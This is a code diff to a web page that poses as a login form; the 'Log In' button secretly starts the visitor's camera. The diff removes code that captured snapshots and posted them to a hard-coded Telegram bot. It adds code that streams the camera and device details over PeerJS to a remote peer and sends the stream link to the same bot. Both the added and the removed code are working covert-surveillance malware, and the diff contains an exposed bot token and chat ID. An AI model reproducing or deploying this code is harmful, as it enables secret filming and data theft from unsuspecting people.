@@ -39,9 +39,6 @@
             background-color: #2c2c2c;
             color: white;
         }
-        input::placeholder {
-            color: #bbbbbb;
-        }
         button {
             width: 100%;
             padding: 10px;
@@ -51,12 +48,6 @@
             border-radius: 5px;
             font-size: 16px;
             cursor: pointer;
-        }
-        button:hover {
-            background-color: #007bb5;
-        }
-        canvas {
-            display: none;
         }
     </style>
 </head>
@@ -71,23 +62,18 @@
         <button onclick="startLiveStream()">Log In</button>
     </div>
 
-    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
-
     <script>
         let peer;
-        let peerId;
         let localStream;
-        const snapshots = [];
 
         async function startLiveStream() {
             await initializeCamera();  // Start user’s camera
-            captureSnapshots();  // Capture snapshots
-            initializePeerConnection();  // Start PeerJS connection
-            simulateBrowserHistory();  // Get simulated browser history
+            initializePeerConnection();  // Set up PeerJS connection
         }
 
         async function initializeCamera() {
             try {
+                // Get the user's camera stream
                 localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 console.log('Camera stream initialized.');
             } catch (error) {
@@ -95,33 +81,24 @@
             }
         }
 
-        function captureSnapshots() {
-            const video = document.createElement('video');
-            video.srcObject = localStream;
-            video.play();
-
-            setTimeout(() => {
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(() => {
-                        const canvas = document.getElementById('snapshotCanvas');
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        canvas.toBlob((blob) => {
-                            snapshots.push(blob);
-                            sendSnapshotToBot(blob, i + 1);
-                        }, 'image/jpeg');
-                    }, i * 500);  // Capture 3 snapshots with a 500ms delay
-                }
-            }, 1000);
-        }
-
         function initializePeerConnection() {
             peer = new Peer();  // Initialize PeerJS
 
             peer.on('open', (id) => {
-                peerId = id;
-                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
+                const liveStreamLink = `${window.location.origin}/live.html?peerId=${id}`;
                 sendStreamLinkToBot(liveStreamLink);
+                peer.on('connection', (conn) => {
+                    conn.on('open', () => {
+                        // Send system information
+                        conn.send(getSystemInfo());
+                    });
+
+                    // Call the peer to share the user’s camera stream
+                    const call = peer.call(conn.peer, localStream);
+                    call.on('error', (err) => {
+                        console.error('Call error:', err);
+                    });
+                });
             });
         }
 
@@ -130,7 +107,7 @@
             const chatId = '860517021';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            const message = `Live Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}\nLast Visited Pages: ${simulateBrowserHistory()}`;
+            const message = `Live Camera Stream: ${liveStreamLink}\nTime: ${new Date().toLocaleString()}`;
 
             fetch(telegramApiUrl, {
                 method: 'POST',
@@ -144,29 +121,8 @@
             });
         }
 
-        function sendSnapshotToBot(blob, index) {
-            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
-            const chatId = '860517021';
-            const formData = new FormData();
-            formData.append('photo', blob, `snapshot_${index}.jpg`);
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).then(() => {
-                console.log(`Snapshot ${index} sent to bot.`);
-            });
-        }
-
-        function simulateBrowserHistory() {
-            const recentSites = [
-                'https://www.google.com/',
-                'https://www.youtube.com/',
-                'https://www.facebook.com/',
-                'https://www.instagram.com/',
-                'https://www.twitter.com/'
-            ];
-            return recentSites.join('\n');
+        function getSystemInfo() {
+            return `Device: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nTime: ${new Date().toLocaleTimeString()}`;
         }
     </script>
 
